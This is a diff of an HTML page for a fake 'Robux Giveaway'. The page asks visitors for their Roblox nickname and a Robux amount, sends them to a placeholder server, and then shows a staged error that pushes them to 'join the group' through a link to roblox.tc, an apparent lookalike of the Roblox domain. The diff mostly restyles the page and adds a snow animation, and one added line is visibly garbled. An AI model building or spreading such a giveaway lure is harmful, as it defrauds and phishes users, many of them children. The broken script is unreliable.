@@ -3,26 +3,30 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>🎁 Robux Giveaway</title>
+  <title>🎄 Robux Giveaway</title>
   <style>
-    body {
+    * {
       margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
       font-family: 'Segoe UI', sans-serif;
-      background: url('https://i.ibb.co/mCzdVJYp/natal-fundo.jpg') no-repeat center center fixed;
+      background: url('https://www.10wallpaper.com/wallpaper/2560x1600/1909/2019_Merry_Christmas_4K_High_Quality_Desktop_2560x1600.jpg') no-repeat center center fixed;
       background-size: cover;
-      backdrop-filter: blur(4px);
       color: white;
+      min-height: 100vh;
+      position: relative;
       overflow: hidden;
     }
 
-    .fog {
+    .snow {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: url('https://i.imgur.com/8fKQZ5P.png') repeat;
-      opacity: 0.2;
       pointer-events: none;
       z-index: 0;
     }
@@ -31,7 +35,7 @@
       position: relative;
       z-index: 1;
       max-width: 400px;
-      margin: 100px auto;
+      margin: 10vh auto;
       background: rgba(0, 0, 0, 0.75);
       padding: 30px;
       border-radius: 15px;
@@ -44,9 +48,9 @@
       color: #ff4444;
     }
 
-    input {
-      width: 90%;
-      padding: 10px;
+    input, button {
+      width: 100%;
+      padding: 12px;
       margin: 10px 0;
       border-radius: 8px;
       border: none;
@@ -57,11 +61,7 @@
       background-color: #ff4444;
       color: white;
       font-weight: bold;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 8px;
       cursor: pointer;
-      margin-top: 10px;
     }
 
     .popup {
@@ -71,11 +71,6 @@
       padding: 20px;
       border-radius: 10px;
       border-left: 4px solid red;
-    }
-
-    .popup p {
-      margin: 10px 0;
-      color: #ff4444;
     }
 
     .popup a {
@@ -88,23 +83,27 @@
       margin-top: 10px;
     }
 
-    .popup a:hover {
-      background-color: #0056b3;
+    @media (max-width: 500px) {
+      .container {
+        width: 90%;
+        margin: 5vh auto;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="fog"></div>
+  <canvas class="snow"></canvas>
+
   <div class="container">
-    <h1>🎄 Robux Giveaway</h1>
+    <h1>🎁 Robux Giveaway</h1>
     <form id="robuxForm">
       <input type="text" id="nick" placeholder="Seu Nick do Roblox" required />
       <input type="number" id="robux" placeholder="Quantidade de Robux" required />
       <button type="submit">Enviar</button>
     </form>
     <div class="popup" id="errorPopup">
-      <p>❌ ERROR: YOU NEED TO JOIN THE GROUP FOR THE ROBUX TO BE SENT TO YOU </p>
-      <p>💸 JOIN THE GROUP TO GET YOUR ROBUX HERE 👇</p>
+      <p>❌ ERROR: YOU NEED TO JOIN THE GROUP TO EARN ROBUX</p>
+      <p>💸 TO RECEIVE YOUR ROBUX, JOIN THE GROUP TO REDEEM ROBUX 👇</p>
       <a href="https://www.roblox.tc/communities/1671585164/RobuxGiveaway" target="_blank">JOIN THE GROUP</a>
     </div>
   </div>
@@ -120,7 +119,7 @@
       const nick = document.getElementById("nick").value;
       const robux = document.getElementById("robux").value;
 
-   fetch("https://seuservidor.com/api/enviar", {
+      fetch("https://seuservidor.com/api/enviar", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -129,6 +128,61 @@
       }).then(res => console.log("Dados enviados"))
         .catch(err => console.error("Erro:", err));
     });
+
+    // ❄️ Névoa caindo (simulação de neve)
+    const canvas = document.query    const ctx = canvas.getContext('2d');
+    let width, height;
+    let flakes = [];
+
+    function resize() {
+      width = canvas.width = window.innerWidth;
+      height = canvas.height = window.innerHeight;
+    }
+
+    window.addEventListener('resize', resize);
+    resize();
+
+    function createFlakes() {
+      flakes = [];
+      for (let i = 0; i < 100; i++) {
+        flakes.push({
+          x: Math.random() * width,
+          y: Math.random() * height,
+          r: Math.random() * 4 + 1,
+          d: Math.random() * 100
+        });
+      }
+    }
+
+    function drawFlakes() {
+      ctx.clearRect(0, 0, width, height);
+      ctx.fillStyle = 'white';
+      ctx.beginPath();
+      for (let i = 0; i < flakes.length; i++) {
+        const f = flakes[i];
+        ctx.moveTo(f.x, f.y);
+        ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2, true);
+      }
+      ctx.fill();
+      moveFlakes();
+    }
+
+    let angle = 0;
+    function moveFlakes() {
+      angle += 0.01;
+      for (let i = 0; i < flakes.length; i++) {
+        const f = flakes[i];
+        f.y += Math.cos(angle + f.d) + 1 + f.r / 2;
+        f.x += Math.sin(angle) * 2;
+
+        if (f.y > height) {
+          flakes[i] = { x: Math.random() * width, y: 0, r: f.r, d: f.d };
+        }
+      }
+    }
+
+    createFlakes();
+    setInterval(drawFlakes, 25);
   </script>
 </body>
 </html>
